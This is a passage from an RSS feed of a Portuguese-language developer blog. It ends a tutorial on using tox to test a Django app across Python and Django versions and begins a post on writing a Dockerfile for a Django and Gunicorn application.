&lt;p&gt;O site oficial da biblioteca a define como:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) a generic virtualenv management and test command line tool (...)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Com &lt;em&gt;tox&lt;/em&gt; é possível:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Validar o seu pacote contra diferentes versões do &lt;em&gt;Python&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;Rodar os seus testes em diferentes &lt;em&gt;environments&lt;/em&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Não é só por usar &lt;a href=&quot;/tag/virtualenv.html&quot; title=&quot;Leia mais sobre Virtualenv&quot;&gt;&lt;em&gt;ambientes virtuais&lt;/em&gt;&lt;/a&gt; que o &lt;em&gt;tox&lt;/em&gt; é
uma boa ideia. Ele vem sendo uma mão na roda para os desenvolvedores de pacotes &lt;em&gt;Python&lt;/em&gt;
que precisam dar suporte às versões &lt;code class=&quot;language-text&quot;&gt;2.x&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;3.x&lt;/code&gt;, e que utilizam testes automatizados como
&lt;em&gt;design&lt;/em&gt; das soluções.&lt;/p&gt;
&lt;p&gt;Com o &lt;em&gt;Django&lt;/em&gt; a &quot;granularidade&quot; pode ser ainda maior, rodando testes em ambientes
que são combinações entre diferentes versões da linguagem e do &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Antes de continuar: Travis e Build Matrix&lt;/h2&gt;
&lt;p&gt;Se você estiver utilizando o &lt;a href=&quot;&quot;&gt;&lt;em&gt;Travis CI&lt;/em&gt;&lt;/a&gt;, poderoso serviço de Continuous Integration, consegue reproduzir o comportamento que apresentaremos
a seguir através do uso de &lt;a href=&quot;https://docs.travis-ci.com/user/customizing-the-build/#Build-Matrix&quot; title=&quot;Customizing the build&quot;&gt;&lt;em&gt;Build Matrix&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;A diferença é que com o &lt;em&gt;tox&lt;/em&gt;, podemos obter o mesmo comportamento em tempo de desenvolvimento. Agilizando um pouco mais o processo.&lt;/p&gt;
&lt;p&gt;Veja mais em &lt;a href=&quot;https://vevurka.github.io/dsp17/git/quality/django/python/travis_ci_frisor/&quot; title=&quot;Setting up Travis CI for github repo in Python&quot;&gt;&quot;Travis CI for Python project&quot;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Na prática&lt;/h2&gt;
&lt;p&gt;Vou aproveitar o tema e usar o &lt;em&gt;tox&lt;/em&gt; para me ajudar em um &lt;em&gt;refactoring&lt;/em&gt; de um &lt;em&gt;app&lt;/em&gt; de
código aberto, que há muito não dou suporte: O &lt;a href=&quot;https://github.com/kplaube/django-simple-contact&quot; title=&quot;Veja no Github&quot;&gt;django-simple-contact&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Se você quiser acompanhar o passo-a-passo, clone o projeto e dê um &lt;code class=&quot;language-text&quot;&gt;git checkout&lt;/code&gt; da &lt;em&gt;revisão&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;80145ae&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ git clone git@github.com:kplaube/django-simple-contact.git
$ cd django-simple-contact/
$ git checkout 80145ae&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Na estrutura atual, é possível executar os testes através do &lt;code class=&quot;language-text&quot;&gt;setup.py&lt;/code&gt; ou &lt;code class=&quot;language-text&quot;&gt;python runtests.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python setup.py test
(...)
-----------------------------------------------
Ran 6 tests in 0.230s

OK
Destroying test database for alias &amp;#39;default&amp;#39;...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;É possível fazer a troca da versão do &lt;em&gt;Python/Django&lt;/em&gt; de forma manual (através do &lt;a href=&quot;/tag/pyenv.html&quot; title=&quot;Leia mais sobre pyenv&quot;&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;, por exemplo).
Obviamente que o &lt;em&gt;tox&lt;/em&gt; deixa tudo mais interessante (e automatizado).&lt;/p&gt;
&lt;h3&gt;Instalando o tox&lt;/h3&gt;
&lt;p&gt;Finalmente, vamos adicionar a ferramenta ao projeto:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install tox&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Caso esteja usando &lt;em&gt;pyenv&lt;/em&gt;, a instalação do &lt;code class=&quot;language-text&quot;&gt;tox-pyenv&lt;/code&gt; é sugerida.
&lt;a href=&quot;https://pypi.python.org/pypi/tox-pyenv&quot; title=&quot;tox plugin that makes tox use &amp;#x60;pyenv which&amp;#x60; to find python executables&quot;&gt;Leia mais sobre a biblioteca&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para deixar tudo mais organizado, vamos nos inspirar na estrutura do projeto
&lt;a href=&quot;https://github.com/vandersonmota/model_mommy&quot; title=&quot;Object factory for django&quot;&gt;&lt;em&gt;modelmommy&lt;/em&gt;&lt;/a&gt;. Criaremos um arquivo &lt;code class=&quot;language-text&quot;&gt;requirements.txt&lt;/code&gt; com o seguinte conteúdo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;# requirements.txt

bleach
django&amp;gt;=1.8.0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;A versão &lt;code class=&quot;language-text&quot;&gt;1.8.0&lt;/code&gt; (até o momento) é a &lt;em&gt;LTS&lt;/em&gt; mais antiga, portanto, garantiremos suporte dessa versão em diante.
O &lt;a href=&quot;https://pypi.python.org/pypi/bleach&quot; title=&quot;An easy safelist-based HTML-sanitizing tool&quot;&gt;&lt;em&gt;bleach&lt;/em&gt;&lt;/a&gt; é uma dependência do projeto, não
relevante ao exemplo desse artigo.&lt;/p&gt;
&lt;p&gt;É interessante deixarmos explícito a instalação do &lt;em&gt;tox&lt;/em&gt;... um &lt;code class=&quot;language-text&quot;&gt;requirements-dev.txt&lt;/code&gt; pode ser uma solução:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;# requirements-dev.txt

tox&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Agora, quando um &lt;em&gt;dev&lt;/em&gt; juntar-se ao projeto, ele poderá executar o comando &lt;code class=&quot;language-text&quot;&gt;pip install -r requirements-dev.txt&lt;/code&gt;, e ter
as dependências necessárias para contribuir com o &lt;em&gt;app&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Configurando&lt;/h3&gt;
&lt;p&gt;Antes de executar a ferramenta é necessário criar um arquivo &lt;code class=&quot;language-text&quot;&gt;tox.ini&lt;/code&gt;, que será responsável por configurar os ambientes
e disparar os testes:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;ini&quot;&gt;&lt;pre class=&quot;language-ini&quot;&gt;&lt;code class=&quot;language-ini&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# tox.ini&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;[tox]&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;envlist&lt;/span&gt; &lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt; py27-django{18,111}, py36-django{18,111,20}&lt;/span&gt;

&lt;span class=&quot;token selector&quot;&gt;[testenv]&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;commands&lt;/span&gt; &lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt; python runtests.py&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;setenv&lt;/span&gt; &lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;    DJANGO_SETTINGS_MODULE&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;simple_contact.tests.test_settings&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;    PYTHONPATH&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;{toxinidir}&lt;/span&gt;
&lt;span class=&quot;token constant&quot;&gt;basepython&lt;/span&gt; &lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;/span&gt;
    py27: python2.7
    py36: python3.6
&lt;span class=&quot;token constant&quot;&gt;deps&lt;/span&gt; &lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;/span&gt;
    bleach
    django18: Django&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;1.8&lt;/span&gt;
    django111: Django&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;1.11&lt;/span&gt;
    django20: Django&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;=&lt;/span&gt;2.0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Por partes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;[tox]&lt;/code&gt;: Aqui colocamos as configurações globais. &lt;code class=&quot;language-text&quot;&gt;envlist&lt;/code&gt; conterá a lista de ambientes nos quais executaremos os testes.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;[testenv]&lt;/code&gt;: Configurações por ambiente de teste. Poderíamos ter configurações específicas ao utilizar &lt;code class=&quot;language-text&quot;&gt;[testenv:py36-django20]&lt;/code&gt;, por exemplo.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;commands&lt;/code&gt;: O comando a ser executado.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;setenv&lt;/code&gt;: Variáveis de ambiente setadas para a execução dos testes.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;basepython&lt;/code&gt;: Nome do interpretador &lt;em&gt;Python&lt;/em&gt; utilizado para a criação do ambiente virtual. Repare no &quot;match&quot; com &lt;code class=&quot;language-text&quot;&gt;py27-&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;py36-&lt;/code&gt; do &lt;code class=&quot;language-text&quot;&gt;envlist&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;deps&lt;/code&gt;: Dependências para determinado ambiente de teste. Repare no &quot;match&quot; com &lt;code class=&quot;language-text&quot;&gt;django{18,111,20}&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Com o uso dos &lt;em&gt;brackets&lt;/em&gt;, ao invés de criarmos um &lt;code class=&quot;language-text&quot;&gt;testenv&lt;/code&gt; para cada combinação (exemplo: &lt;code class=&quot;language-text&quot;&gt;py27-django18&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;py27-django111&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;py36-django18&lt;/code&gt;, etc),
o &lt;em&gt;tox&lt;/em&gt; fica responsável por fazer a &quot;matriz de combinações&quot;.&lt;/p&gt;
&lt;p&gt;Agora sim, podemos executar a ferramenta de linha de comando:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ tox
(...)
ERROR:   py27-django18: commands failed
ERROR:   py27-django111: commands failed
ERROR:   py36-django18: commands failed
ERROR:   py36-django111: commands failed
py36-django20: commands succeeded&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;No meu ambiente local, como esperado, apenas os testes do ambiente &lt;code class=&quot;language-text&quot;&gt;py36-django20&lt;/code&gt; passaram. Para ter acesso a versão corrigida,
dê um &lt;em&gt;checkout&lt;/em&gt; da revisão &lt;code class=&quot;language-text&quot;&gt;a37ebd1608&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ git checkout a37ebd1608
$ tox
(...)
py27-django18: commands succeeded
py27-django111: commands succeeded
py36-django18: commands succeeded
py36-django111: commands succeeded
py36-django20: commands succeeded&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Perfeito!&lt;/p&gt;
&lt;p&gt;Ainda é possível executar apenas os testes de um ambiente específico:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ tox -e py36-django20
(...)
-----------------------------------------------
Ran 6 tests in 0.055s

OK
Destroying test database for alias &amp;#39;default&amp;#39;...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O resultado final está disponível na &lt;em&gt;tag&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;0.3.0&lt;/code&gt; do projeto.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Que esse movimento da comunidade &lt;em&gt;Django&lt;/em&gt; consiga influenciar ainda mais a adoção do &lt;em&gt;Python 3&lt;/em&gt;. Admito que sem essa
&quot;motivação extra&quot;, dificilmente cogitaria o &lt;em&gt;upgrade&lt;/em&gt; da linguagem em meus projetos nesse momento.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;tox&lt;/em&gt; é sem dúvida uma ferramenta que pode auxiliar nessa fase de transição, portanto, não hesite em adicioná-la ao seu &lt;em&gt;toolbelt&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para uma integração &lt;em&gt;seamless&lt;/em&gt; com o &lt;em&gt;Travis CI&lt;/em&gt;, o &lt;a href=&quot;https://github.com/tox-dev/tox-travis&quot; title=&quot;Seamless integration of Tox into Travis CI&quot;&gt;&lt;em&gt;tox-travis&lt;/em&gt;&lt;/a&gt;
é recomendado.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.activestate.com/blog/2017/01/python-3-vs-python-2-its-different-time&quot;&gt;ActiveState - Python 3 vs Python 2: It&apos;s different this time&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://henriquebastos.net/desmistificando-o-conceito-de-django-apps/&quot;&gt;Henrique Bastos - Desmistificando O Conceito De Django Apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://jsatt.com/blog/using-tox-with-travis-ci-to-test-django-apps/&quot;&gt;Jeremy Satterfield - Using Tox with Travis CI to Test Django Apps&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://vevurka.github.io/dsp17/git/quality/django/python/travis_ci_frisor/&quot;&gt;vevurka-dev - Travis CI for Python project&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Uma ode ao Docker - Parte 3]]></title><description><![CDATA[Nos posts
anteriores
arranhamos um pouco o conceito por trás do Docker,
bem como introduzimos o utilitário de linha de comando . Nesse último artigo da série, vamos
explorar como usar o Dockerfile no empacotamento de uma aplicação Django. Se você ainda tem dúvidas em como "encaixar" o Docker no seu…]]></description><link>https://klauslaube.com.br/2017/08/11/uma-ode-ao-docker-parte-3.html</link><guid isPermaLink="false">https://klauslaube.com.br/2017/08/11/uma-ode-ao-docker-parte-3.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Fri, 11 Aug 2017 18:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Nos &lt;a href=&quot;/2017/01/14/uma-ode-ao-docker-parte-1.html&quot; title=&quot;Uma ode ao Docker - Parte 1&quot;&gt;&lt;em&gt;posts&lt;/em&gt;&lt;/a&gt;
&lt;a href=&quot;/2017/05/01/uma-ode-ao-docker-parte-2.html&quot; title=&quot;Uma ode ao Docker - Parte 2&quot;&gt;anteriores&lt;/a&gt;
arranhamos um pouco o conceito por trás do &lt;a href=&quot;/tag/docker.html&quot; title=&quot;Leia mais sobre Docker&quot;&gt;&lt;em&gt;Docker&lt;/em&gt;&lt;/a&gt;,
bem como introduzimos o utilitário de linha de comando &lt;code class=&quot;language-text&quot;&gt;docker&lt;/code&gt;. Nesse último artigo da série, vamos
explorar como usar o &lt;em&gt;Dockerfile&lt;/em&gt; no empacotamento de uma aplicação &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Se você ainda tem dúvidas em como &quot;encaixar&quot; o &lt;em&gt;Docker&lt;/em&gt; no seu fluxo de desenvolvimento,
o artigo &lt;a href=&quot;http://www.patricksoftwareblog.com/why-i-switched-from-a-traditional-deployment-to-using-docker/&quot; title=&quot;Leia na íntegra&quot;&gt;&quot;Why I Switched from a Traditional Deployment to Using Docker&quot;&lt;/a&gt;
pode ser uma boa leitura.&lt;/p&gt;
&lt;h2&gt;Configurando a aplicação Django&lt;/h2&gt;
&lt;p&gt;Vamos configurar uma aplicação de exemplo para sermos capazes de dar os passos necessários
na criação do &lt;code class=&quot;language-text&quot;&gt;Dockerfile&lt;/code&gt;. Primeiramente, vamos criar
&lt;em&gt;&lt;a href=&quot;/tag/virtualenv.html&quot; title=&quot;Leia mais sobre virtualenv&quot;&gt;virtualenv&lt;/a&gt; Python&lt;/em&gt; com &lt;a href=&quot;/tag/pyenv.html&quot; title=&quot;Leia mais sobre Pyenv&quot;&gt;&lt;em&gt;pyenv&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pyenv virtualenv 3.6.1 helloworld-django-docker&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Criamos o diretório para o projeto:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ mkdir ~/Workspace/helloworld
$ cd ~/Workspace/helloworld/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ativamos o &lt;em&gt;virtualenv&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pyenv activate helloworld-django-docker&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Instalamos as dependências &lt;em&gt;Django&lt;/em&gt; e iniciamos o projeto:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ pip install django gunicorn
(...)

$ pip freeze &amp;gt; requirements.txt
$ django-admin startproject helloworld ~/Workspace/helloworld&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Rodamos o &lt;code class=&quot;language-text&quot;&gt;python manage.py runserver&lt;/code&gt; só para termos certeza que está tudo ok:&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 680px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/5a7440d2ea5c9d929abc9e6b2ea893c9/c5bb3/django-it-worked.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 19.270833333333332%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsSAAALEgHS3X78AAAAq0lEQVQI13WKyw6CMBQF+f8/Mu6MKzcGLuVxKwIWKrQgyEOBKFirGxcmk5PJ5Bjrrb3awB7lMX9SPv6QDkH2iOTyD2MHbAcJBBc37pyogaBSrrcyaYHJPS6WUGjkHIpZy7cYCS8yUbFUJFwyLnNZp1mpylnDs7Juh7afmn5sb9NHmk6V8doNBlimQ2wCYClxiOe5vufGUUgR390G1yHKKfqUojocKCoQfcZOL97B1oafqCcPAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;It worked&amp;quot;&quot;
        title=&quot;It worked&quot;
        src=&quot;/static/5a7440d2ea5c9d929abc9e6b2ea893c9/c5bb3/django-it-worked.png&quot;
        srcset=&quot;/static/5a7440d2ea5c9d929abc9e6b2ea893c9/8514f/django-it-worked.png 192w,
/static/5a7440d2ea5c9d929abc9e6b2ea893c9/804b2/django-it-worked.png 384w,
/static/5a7440d2ea5c9d929abc9e6b2ea893c9/c5bb3/django-it-worked.png 680w&quot;
        sizes=&quot;(max-width: 680px) 100vw, 680px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;It worked&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Além disso, garantimos que o &lt;code class=&quot;language-text&quot;&gt;gunicorn&lt;/code&gt; rodará sem maiores problemas:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ gunicorn helloworld.wsgi:application \
    --bind 0.0.0.0:8000 \
    --workers 3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Para saber mais sobre o &lt;em&gt;Gunicorn&lt;/em&gt;, leia a &lt;a href=&quot;http://docs.gunicorn.org/en/stable/design.html&quot; title=&quot;Documentação do Gunicorn&quot;&gt;documentação oficial&lt;/a&gt; do projeto.&lt;/p&gt;
&lt;h2&gt;Entra o Dockerfile&lt;/h2&gt;
&lt;p&gt;Com o &lt;a href=&quot;https://docs.docker.com/engine/installation/&quot; title=&quot;Instalando o Docker&quot;&gt;&lt;em&gt;Docker&lt;/em&gt; instalado&lt;/a&gt;,
vamos começar a escrever o &lt;code class=&quot;language-text&quot;&gt;Dockerfile&lt;/code&gt;. O &lt;a href=&quot;http://www.mundodocker.com.br/o-que-e-dockerfile/&quot; title=&quot;O que é o Dockerfile&quot;&gt;&lt;em&gt;Mundo Docker&lt;/em&gt;&lt;/a&gt; define o arquivo como:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) um arquivo de definição onde é possível realizar ou preparar todo ambiente a
partir de um script de execução. Em resumo, o Dockerfile é um arquivo texto
com instruções, comandos e passos que você executaria manualmente, basicamente
o Docker executa uma receita de bolo.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;É nesse arquivo que escreveremos todos os procedimentos que o &lt;em&gt;Docker&lt;/em&gt; executará para criar
a imagem da nossa aplicação.&lt;/p&gt;
&lt;h3&gt;Por partes, como diria Jack&lt;/h3&gt;
&lt;p&gt;Começamos especificando qual será a &quot;imagem base&quot; da nossa imagem/&lt;em&gt;container&lt;/em&gt;. Faremos isso
através da expressão &lt;code class=&quot;language-text&quot;&gt;FROM&lt;/code&gt;. Poderíamos dizer aqui que queremos estender a imagem &lt;a href=&quot;https://hub.docker.com/_/debian/&quot; title=&quot;Imagem Debian no Dockerhub&quot;&gt;_/debian&lt;/a&gt;
e realizar toda a instalação do &lt;a href=&quot;/tag/python.html&quot; title=&quot;Leia mais sobre Python&quot;&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;.
Mas felizmente já existem imagens prontas com a linguagem no &lt;em&gt;Docker Hub&lt;/em&gt;.
Vamos com a &lt;a href=&quot;https://hub.docker.com/_/python/&quot; title=&quot;Imagem Python no Docker Hub&quot;&gt;imagem oficial&lt;/a&gt; como base:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;dockerfile&quot;&gt;&lt;pre class=&quot;language-dockerfile&quot;&gt;&lt;code class=&quot;language-dockerfile&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# Dockerfile&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; python&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;3&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Quando &quot;buildarmos&quot;, o &lt;em&gt;Docker&lt;/em&gt; baixará a imagem do &lt;em&gt;Python&lt;/em&gt; do repositório (se ela já não existir localmente
em sua máquina), e dará sequência às instruções encontradas no &lt;code class=&quot;language-text&quot;&gt;Dockerfile&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Uma boa prática é &quot;fecharmos o escopo&quot; de trabalho ao setar explicitamente qual será o
diretório no qual iremos realizar demais operações como cópia de arquivos ou execução de binários. Para isso
temos o comando &lt;code class=&quot;language-text&quot;&gt;WORKDIR&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;dockerfile&quot;&gt;&lt;pre class=&quot;language-dockerfile&quot;&gt;&lt;code class=&quot;language-dockerfile&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; python&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;3

&lt;span class=&quot;token keyword&quot;&gt;WORKDIR&lt;/span&gt; /usr/src/app&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Agora podemos instalar o &lt;em&gt;Django&lt;/em&gt; e o &lt;em&gt;Gunicorn&lt;/em&gt;, assim como fizemos no início desse artigo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;dockerfile&quot;&gt;&lt;pre class=&quot;language-dockerfile&quot;&gt;&lt;code class=&quot;language-dockerfile&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;FROM&lt;/span&gt; python&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;3

&lt;span class=&quot;token keyword&quot;&gt;WORKDIR&lt;/span&gt; /usr/src/app

&lt;span class=&quot;token keyword&quot;&gt;COPY&lt;/span&gt; requirements.txt ./
&lt;span class=&quot;token keyword&quot;&gt;RUN&lt;/span&gt; pip install &lt;span class=&quot;token punctuation&quot;&gt;-&lt;/span&gt;r requirements.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Você já deve ter reparado um padrão na escrita do &lt;code class=&quot;language-text&quot;&gt;Dockerfile&lt;/code&gt;, certo? Os comandos (em maiúsculo)
determinam qual operação será realizada. Os parâmetros (em minúsculo) determinam como isso irá ocorrer.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 640px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f70d10e197bf514f40c7912e834b89cb/c08c5/docker-dory-whale.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
